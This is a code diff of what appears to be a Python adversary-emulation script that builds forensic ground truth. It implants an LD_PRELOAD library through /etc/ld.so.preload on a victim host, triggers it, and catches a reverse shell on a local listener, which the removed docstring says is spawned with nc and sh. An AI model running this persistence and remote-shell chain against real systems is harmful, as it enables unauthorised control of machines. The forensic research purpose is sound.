@@ -38,11 +38,9 @@ Disk:
                               -- if cleanup IS run: file absent or truncated
 
 Memory:
-  gcc process (during prereq compile)
-  sh writing /etc/ld.so.preload (T1574.006 executor)
-  any process spawned after step 2 has /tmp/T1574006.so in its maps
-  nc + sh reverse shell process and its open socket (step 4)
-"""
+  any process spawned after step 2 has /tmp/T1574006.so mapped in its address space
+  confirmed by constructor banner in stdout of trigger process and reverse shell
+  forensic artifact: /proc/<pid>/maps entry for /tmp/T1574006.so"""
 
 from __future__ import annotations
 
@@ -95,7 +93,7 @@ def run(
     steps = ground_truth["steps"]
 
     # Step 1 -- discovery (best-effort, a failed discovery does not abort the run)
-    _log.info("[1/4] discovery")
+    console.step_header("[1/4] discovery")
     result = runner.run_test(_DISCOVERY_T, _DISCOVERY_G, raise_on_error=False)
     steps.append({"step": "discovery", **result})
 
@@ -103,7 +101,7 @@ def run(
     # Prereq compiles the .so on the victim (offline-safe: no network call in the
     # ART source). We bracket with internet_on/off anyway so the convention holds
     # for future scenarios whose prereqs do fetch assets over the network.
-    _log.info("[2/4] LD_PRELOAD infection")
+    console.step_header("[2/4] LD_PRELOAD infection")
     internet_on()
     try:
         runner.run_prerequisites(_LDPRELOAD_T, _LDPRELOAD_G, timeout=60)
@@ -117,25 +115,25 @@ def run(
     # The .so hooks getuid(3) to return 0; we capture `id` output as evidence.
     # Even if the hook does not work (e.g. libc version mismatch), the process
     # still has /tmp/T1574006.so mapped in memory -- a recoverable artifact.
-    _log.info("[3/4] LD_PRELOAD hook trigger")
+    console.step_header("[3/4] LD_PRELOAD hook trigger")
     result = _trigger_hook(ssh)
     steps.append({"step": "ldpreload_trigger", **result})
 
     # Step 4 -- reverse shell
     # The shell spawned here inherits the hooked environment; its process maps
     # will show /tmp/T1574006.so loaded.
-    _log.info("[4/4] reverse shell")
+    console.step_header("[4/4] reverse shell")
     result = _run_reverse_shell(ssh, host_ip)
     steps.append({"step": "reverse_shell", **result})
 
     # Cleanup (optional -- leave False to preserve all artifacts for forensics)
     if run_cleanup:
-        _log.info("cleanup: history clear + LD_PRELOAD removal")
+        console.step_header("cleanup")
         runner.run_test(_CLEANUP_T, _CLEANUP_G, raise_on_error=False)
         runner.run_cleanup(_LDPRELOAD_T, _LDPRELOAD_G)
         steps.append({"step": "cleanup", "run": True})
     else:
-        _log.info("cleanup: skipped (artifacts preserved)")
+        console.step_header("cleanup (skipped: artifacts preserved)")
         steps.append({"step": "cleanup", "run": False})
 
     return ground_truth
@@ -145,28 +143,20 @@ def run(
 
 
 def _trigger_hook(ssh: SSHClient) -> dict[str, Any]:
-    """
-    Spawn a new process that loads /etc/ld.so.preload and run `id`.
-
-    The ART T1574.006 executor writes the preload entry but does not start any
-    new process afterwards, so the hook is technically active but never exercised.
-    This step closes that gap: it spawns a fresh sh session so the dynamic linker
-    picks up the .so, then runs `id` to capture whether getuid() was hooked.
-
-    hook_active is True when id output contains "uid=0" (root), indicating the
-    getuid hook returned 0. False means the library loaded but the hook had no
-    observable effect (libc mismatch, non-fatal for forensic purposes).
-    """
     code, out, err = ssh.run("sh -c 'id'", timeout=10)
-    hook_active = "uid=0" in out
-    if hook_active:
-        console.ok(f"LD_PRELOAD hook active: {out.strip()}")
+    # The .so has only a constructor that prints a banner (no symbol hooks).
+    # Presence of this string confirms the dynamic linker loaded the library.
+    loaded = "Loaded Atomic Red Team Library" in out
+    if loaded:
+        console.ok("LD_PRELOAD .so confirmed loaded (constructor ran)", indent=True)
     else:
-        console.warn(f"LD_PRELOAD hook not observed in id output: {out.strip()!r}")
+        console.warn(
+            f"LD_PRELOAD .so constructor not observed: {out.strip()!r}", indent=True,
+        )
     return {
         "exit_code": code,
         "id_output": out.strip(),
-        "hook_active": hook_active,
+        "so_loaded": loaded,
     }
 
 
@@ -192,11 +182,21 @@ def _run_reverse_shell(ssh: SSHClient, host_ip: str) -> dict[str, Any]:
                 srv.listen(1)
                 srv.settimeout(_REVSHELL_TIMEOUT)
                 conn, addr = srv.accept()
-                console.ok(f"reverse shell connected from {addr}")
+                console.ok(f"reverse shell connected from {addr}", indent=True)
                 conn.sendall(b"id\n")
-                time.sleep(0.5)
-                data = conn.recv(4096)
-                received.append(data.decode(errors="replace").strip())
+                conn.sendall(b"id\n")
+                time.sleep(0.8)  # slightly longer to let sh flush its startup noise
+                data = conn.recv(4096).decode(errors="replace")
+                # Strip /bin/sh startup noise and the prompt characters before recording
+                clean_lines = [
+                    ln
+                    for ln in data.splitlines()
+                    if ln.strip()
+                    and not ln.startswith("/bin/sh:")
+                    and not ln.strip().startswith("$")
+                    and not ln.strip().startswith("#")
+                ]
+                received.append("\n".join(clean_lines).strip())
                 conn.sendall(b"exit\n")
                 conn.close()
         except Exception as exc:
@@ -218,11 +218,14 @@ def _run_reverse_shell(ssh: SSHClient, host_ip: str) -> dict[str, Any]:
     listener.join(timeout=_REVSHELL_TIMEOUT + 2)
 
     if error:
-        console.warn(f"reverse shell listener error: {error[0]}")
+        console.warn(f"reverse shell listener error: {error[0]}", indent=True)
     elif not received:
-        console.warn("reverse shell: no data received (connection may have failed)")
+        console.warn(
+            "reverse shell: no data received (connection may have failed)",
+            indent=True,
+        )
     else:
-        console.ok(f"reverse shell id output: {received[0]}")
+        console.ok(f"id output: {received[0]}", indent=True)
 
     return {
         "exit_code": code,
